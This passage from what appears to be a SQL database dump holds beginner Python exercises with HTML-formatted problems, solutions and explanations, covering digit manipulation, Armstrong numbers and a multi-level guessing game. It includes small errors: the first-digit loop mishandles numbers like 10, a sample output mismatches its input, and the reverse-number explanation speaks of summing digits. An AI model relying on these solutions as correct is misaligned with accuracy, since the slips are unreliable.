2:</p><p>Enter the number: 974</p><p>Enter the Digit : 3</p><p>Sample Output 2:</p><p>3 is not occurred in 974</p><p><br></p>','B','<p>num = int(input(\"Enter the number\"))</p><p>digit = int(input(\"Enter a Digit\"))</p><p>count = 0</p><p>n = num</p><p>while n != 0:</p><p>&nbsp; &nbsp; rem = n % 10</p><p>&nbsp; &nbsp; if rem == digit:</p><p>&nbsp; &nbsp; &nbsp; &nbsp;print(\"{} is occured in {}\".format(digit,num))</p><p>&nbsp; &nbsp; &nbsp; &nbsp;break</p><p>&nbsp; &nbsp; n = n // 10</p><p>else:</p><p>&nbsp; &nbsp; print(\"{} is not occured in {}\".format(digit,num))</p>',NULL,'<p>calculate the remainder of a number by doing number % 10</p><p>check remainder is equal to digit, if it is equal print digit occurred, else divide number by the 10 and repeat the above steps till number becomes zero.</p>',26,NULL,NULL,NULL),(1057,'Count the Number of Occurrences of digit in a number using Python','count-the-number-of-occurrences-of-digit-in-a-number-using-python','<p>Get a number and a digit and find occurrences of digit in the number.</p><p>Sample Input 1:</p><p>Enter the number: 2434</p><p>Enter the Digit : 4</p><p>Sample Output 1:</p><p>4 is occurred 2 times in 234&nbsp;</p><p>Sample Input 2:</p><p>Enter the number: 974</p><p>Enter the Digit : 3</p><p>Sample Output 2:</p><p>3 is occurred 0 times in 974</p>','B','<p>num = int(input(\"Enter the number\"))</p><p>digit = int(input(\"Enter a Digit\"))</p><p>count = 0</p><p>n = num</p><p>while n != 0:</p><p>&nbsp; &nbsp; rem = n % 10</p><p>&nbsp; &nbsp; if rem == digit:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; count+=1</p><p>&nbsp; &nbsp; n = n // 10</p><p>print(\"{} occured {} times in {}\".format(digit,count,num))</p>',NULL,'<p>initialize count is equal to 0</p><p>calculate the remainder of a number by doing number % 10</p><p>check remainder is equal to digit, if it is equal increment the count by 1 , else divide number by the 10 and repeat the above steps till number becomes zero.</p><p>print the count.</p>',26,NULL,NULL,NULL),(1058,'Print the first Digit of a Number using Python','print-the-first-digit-of-a-number-using-python','<p>Get a number and print its First Digit.</p><p>Sample Input 1:</p><p>Enter the number: 234</p><p>Sample Output 1:<br></p><p>2 is the first digit of 234</p>','B','<p>num = int(input(\"enter a number\"))</p><p>n = num</p><p>while n &gt; 10:</p><p>&nbsp; &nbsp; n = n // 10</p><p>print(\"{} is the first digit of {}\".format(n,num))</p>',NULL,'<p>divide the number by 10 till number is greater than 10, once it is less than 10 then print the number. you will get the first digit.</p>',26,NULL,NULL,NULL),(1059,'Sum of Digits of the number using Python','sum-of-digits-of-the-number-using-python','<p>Get a number and sum the digits of the number.</p><p>Sample Input 1:</p><p>Enter the number: 234</p><p>Sample Output 1:<br></p><p>9</p><p><br></p><p><br></p>','B','<p>num = int(input(\"enter a number\"))</p><p>n = num</p><p>total = 0</p><p>while n != 0:</p><p>&nbsp; &nbsp; rem = n % 10</p><p>&nbsp; &nbsp; total = total + rem</p><p>&nbsp; &nbsp; n = n // 10</p><p>print(total)</p>',NULL,'<p>initialize total is equal to 0</p><p>calculate the remainder of a number by doing number % 10,&nbsp; add the remainder to total and divide the number by the 10 and repeat the above steps till number becomes zero.</p><p>Print the total, you will get the sum of digits of the number.</p>',26,NULL,NULL,NULL),(1060,'Product of Digits of the number using Python','product-of-digits-of-the-number-using-python','<p>Get a number and multiply the digits of the number.</p><p>Sample Input 1:</p><p>Enter the number: 234</p><p>Sample Output 1:<br></p><p>24</p><p><br></p>','B','<p>num = int(input(\"enter a number\"))</p><p>n = num</p><p>product = 1</p><p>while n != 0:</p><p>&nbsp; &nbsp; rem = n % 10</p><p>&nbsp; &nbsp; product = product * rem</p><p>&nbsp; &nbsp; n = n // 10</p><p>print(product)</p>',NULL,'<p>initialize product is equal to 1</p><p>calculate the remainder of a number by doing number % 10,&nbsp; multiply the remainder with total and divide the number by the 10 and repeat the above steps till number becomes zero.</p><p>Print the product, you will get the product of digits of the number.</p>',26,'output/product_digits_of_number_c_dnk6D6I.jpg','raptor/Product_digits_of_number_pIJ0BfG.PNG',''),(1061,'Reverse the digits of a number using Python','reverse-the-digits-of-a-number-using-python','<p>Get a number and reverse the digits of the number.</p><p>Sample Input 1:</p><p>Enter the number: 234</p><p>Sample Output 1:<br></p><p>432 is reverse of 234</p>','B','<p>num = int(input(\"enter a number\"))</p><p>n = num</p><p>reverse = 0</p><p>while n != 0:</p><p>&nbsp; &nbsp; rem = n % 10</p><p>&nbsp; &nbsp; reverse = reverse * 10 + rem</p><p>&nbsp; &nbsp; n = n // 10</p><p>print(\"{} is reverse of {}\".format(reverse,num))</p>',NULL,'<p>initialize total is equal to 0</p><p>calculate the remainder of a number by doing number % 10,&nbsp; add the remainder to (total * 10) and divide the number by the 10 and repeat the above steps till number becomes zero.</p><p>Print the total, you will get the sum of digits of the number.</p>',26,'output/reverse_of_a_number_c_wBJpoC6.jpg','raptor/Reverse_of_a_number_IsoeXiS.PNG',''),(1062,'Find a number is Armstrong number or not using Python','find-a-number-is-armstrong-number-or-not-using-python','<p>Get a number and sum the digits of the number.</p><p>Sample Input 1:</p><p>Enter the number: 153</p><p>Sample Output 1:<br></p><p>Armstrong Number</p><p>Sample Input 2:<br></p><p>Enter the number: 213</p><p>Sample Output 2:<br></p><p>Not an Armstrong Number</p>','B','<p>num = int(input(\"enter a number\"))</p><p>n = num</p><p>count = 0</p><p><br></p><p>while n != 0:</p><p>&nbsp; &nbsp; count = count + 1</p><p>&nbsp; &nbsp; n = n // 10</p><p>&nbsp; &nbsp;&nbsp;</p><p>n = num</p><p>total = 0</p><p>while n!= 0:</p><p>&nbsp; &nbsp; rem = n % 10</p><p>&nbsp; &nbsp; total = total + (rem**count)</p><p>&nbsp; &nbsp; n = n // 10</p><p><br></p><p>if num == total:</p><p>&nbsp; &nbsp; print(\"Armstrong number\")</p><p>else:</p><p>&nbsp; &nbsp; print(\"Not an Armstrong number\")</p><p>&nbsp; &nbsp;&nbsp;</p>',NULL,'<p>using a while loop, count the number of digits in a number</p><p>initialize total is equal to 0</p><p>calculate the remainder of a number by doing number % 10,&nbsp; add the remainder&nbsp;<span style=\"font-size: 10.5px;\"><sup>count</sup>&nbsp;</span> to the total and divide the number by the 10 and repeat the above steps till number becomes zero.</p><p>Check total is equal to original number entered by user, if it is equal print Armstrong Number else Not an Armstrong Number.</p>',26,'output/armstrong_number_c_px4U6er.jpg','raptor/Amstrong_number_FLWBctV.PNG',''),(1063,'Simple Guessing Game in Python','guessing-game-in-python-level-1','<div>\"Simple Guessing Game\"</div><div>Create a simple guessing game in which the user must guess the secret number in one attempt. If the user correctly guessed the secret number, the system should display \"your guess is correct,\" otherwise it should display the message \"your guess is wrong\" and the guessed number.</div><div>Hint : Basic if-else condition is enough for this.</div><div>Objective : To learn the usage of if-else conditional statement.</div>','B','<div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; line-height: 19px; white-space: pre;\"><div style=\"\"><div style=\"line-height: 19px;\"><span style=\"background-color: rgb(255, 255, 255);\">#hashed lines are comment lines used to illustrate the program</span></div><div style=\"line-height: 19px;\"><span style=\"background-color: rgb(255, 255, 255);\">#import the built in method randint to generate an automatic secret number</span></div><div style=\"line-height: 19px;\"><span style=\"background-color: rgb(255, 255, 255);\">from random import randint</span></div><div style=\"line-height: 19px;\"><span style=\"background-color: rgb(255, 255, 255);\">#Generate automatic Secret Number<br></span></div></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">secret_number = randint(1,5)</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#Get a guessing number from user <br></span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">guess_number = int(input(\"Guess the secret number between 1 and 5:\"))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#check guessing number is correct or not<br></span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">if secret_number == guess_number:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Your Guess is Correct\")</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">else:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Your Guess is Wrong, the secret number is {}\".format(secret_number))</span></div></div>',NULL,'<p>Line 3: Imports the randint function from the package random</p><p>Line 5: using randint system generates a secret number</p><p>Line 7 : getting a guess from user</p><p>line 9 : check whether secret number generated by system and guessing number entered by user are same</p><p>line 10 : if same, display \"your guess is correct\"</p><p>line 12 : if not same, display \"your guess is wrong\"</p>',27,NULL,NULL,NULL),(1064,'Guessing Game with Clue in Python','guessing-game-in-python-level-2','<div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">\"Guessing Game with Insights\"</div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Create a simple guessing game in which the user must guess the secret number in one attempt. If the user correctly guessed the secret number, the system should display \"your guess is correct,\" otherwise it should tell guessed number is higher or lower than the secret number.</div><div style=\"font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><span style=\"color: rgb(79, 79, 79);\">Example If secret number is 3 and guessed number is 4 then system should display </span><span style=\"background-color: rgb(255, 255, 255);\">\"<span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre; font-size: 14px;\">Your Guess is higher than secret number\".</span></span></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Hint : Basic if-elif-else condition is enough for this.</div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Objective : To learn the usage of if-elif-else conditional statement.</div>','B','<div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; line-height: 19px; white-space: pre;\"><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#hashed lines are comment lines used to illustrate the program</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#import the built in method randint to generate an automatic secret number</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">from random import randint</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#Generate automatic Secret Number</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">secret_number = randint(1,5)</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#Get a guessing number from user</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">guess_number = int(input(\"Guess the secret number between 1 and 5:\"))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#check guessing number is correct or higher or lower</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">if secret_number == guess_number:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Your Guess is Correct\")</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">elif guess_number &lt; secret_number:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Your Guess is lower than secret number {}\".format(secret_number))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">else:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Your Guess is higher than secret number {}\".format(secret_number))</span></div></div>',NULL,'<p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 3: Imports the randint function from the package random</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 5: using randint system generates a secret number</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 7 : getting a guess from user</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 9 : check whether secret number generated by system and guessing number entered by user are same</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 10 : if same, display \"your guess is correct\"</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 11 : if not same, check whether&nbsp; guessing number entered by user is less than secret number generated by system</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 12 : if lower, display your guess is lower than the secret number</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 14 : if not, display your guess is higher than the secret number</p>',27,NULL,NULL,NULL),(1065,'Multi Attempt Guessing Game with clues in Python','guessing-game-in-python-level-3','<div style=\"\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><span style=\"font-size: 16px;\">\"Guessing Game with Five Attempts\"</span></font></div><div style=\"\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><span style=\"font-size: 16px;\">Create a simple guessing game in which the user must guess the secret number in five attempts.&nbsp;If the user correctly guessed the secret number, the system should display \"your guess is correct\" and end the game; otherwise, it should tell the user whether the guessed number is higher or lower than the secret number and proceed to the next attempt. If the user fails to guess correctly after five attempts, the game should end with the message \"Game Over, You Lose the Game.\"</span></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Hint : Basic looping (for or while) is enough for this.</div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Objective : To learn the usage of looping statement.</div>','B','<div style=\"line-height: 19px;\"><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">#hashed lines are comment lines used to illustrate the program</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">#import the built in method randint to generate an automatic secret number</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">from random import randint</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">secret_number = randint(1,10)</span></div><div style=\"\"><font face=\"Consolas, Courier New, monospace\"><span style=\"white-space: pre; background-color: rgb(255, 255, 255);\">#looping statement for 5 attempts</span></font></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">for counter in range(0,5):</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    #gets the guessing number as user input</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    guess_number = int(input(\"Guess the secret number between 1 and 10 ({} attempts left):\".format(5-counter)))</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    #check guessing number is correct or higher or lower</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    if secret_number == guess_number:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"Your Guess is Correct, You Won the Game\")</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        break</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    elif guess_number &lt; secret_number:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"Your Guess is lower than secret number\")</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    else:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"Your Guess is higher than secret number\")</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">else: #else of for statement</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Game Over, You Loose the Game, secret number is {}\".format(secret_number)) </span></div><br></div>',NULL,'<p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 3: Imports the randint function from the package random</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 5: using randint system generates a secret number</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 6 : looping statement to allow user 5 attempts</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 8 : getting guessing number from user as input</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 10 :&nbsp;<span style=\"font-size: 1.125rem;\">check whether secret number generated by system and guessing number entered by user are same</span></p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 11 : if same, display \"your guess is correct\"</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 12 : stops the game, if user guessed correctly</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 13 : if not same, check whether&nbsp; guessing number entered by user is less than secret number generated by system</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 14 : if lower, display your guess is lower than the secret number</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 16 : if not, display your guess is higher than the secret number</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 17 : is else statement of for statement (python only having this when compare to C, C++ and java)</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 18 : executes after all the iterations of for (note : break statement doesn\'t allow to run else statement of for which means you guessed correctly this else will not work)</p>',27,NULL,NULL,NULL),(1066,'Multi Stage Guessing Game in Python','guessing-game-in-python-level-4','<div style=\"\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\" style=\"\"><span style=\"font-size: 16px;\">\"Multi Stage Guessing Game\"</span></font></div><div style=\"\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\" style=\"\"><span style=\"font-size: 16px;\">Create a three stage guessing game in each stage the user must guess the secret number in five attempts. Range of Secret number should be increased at stage like 1 to 10 in stage in 1, 1 to 20 in stage 2 and 1 to 30 in stage 3. If the user correctly guessed the secret number, the system should display \"your guess is correct\" and moves to next stage; otherwise, it should tell the user whether the guessed number is higher or lower than the secret number and proceed to the next attempt. If the user fails to guess correctly after five attempts, the game should end with the message \"Game Over, You Lose the Game.\" If user successfully&nbsp;guessed in all the three stages, display \"You won the Game\" and stops the game.</span></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Hint : Nested looping (loop inside loop) is needed for this.</div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Objective : To learn the usage of nested looping statement.</div>','B','<div style=\"color: rgb(212, 212, 212); background-color: rgb(30, 30, 30); font-family: Consolas, &quot;Courier New&quot;, monospace; line-height: 19px; white-space: pre;\"><div><span style=\"color: #ce9178;\">#hashed lines are comment lines used to illustrate the program</span></div><div><span style=\"color: #ce9178;\">#import the built in method randint to generate an automatic secret number</span></div><div><span style=\"color: #ce9178;\">from random import randint</span></div><div><span style=\"color: #ce9178;\"># intiate level or stage as 1 </span></div><div><span style=\"color: #ce9178;\">level = 1</span></div><div><span style=\"color: #ce9178;\">#loop for 3stages</span></div><div><span style=\"color: #ce9178;\">while level &lt;= 3:</span></div><div><span style=\"color: #ce9178;\">    #complexity range for each stage</span></div><div><span style=\"color: #ce9178;\">    end_value = level * 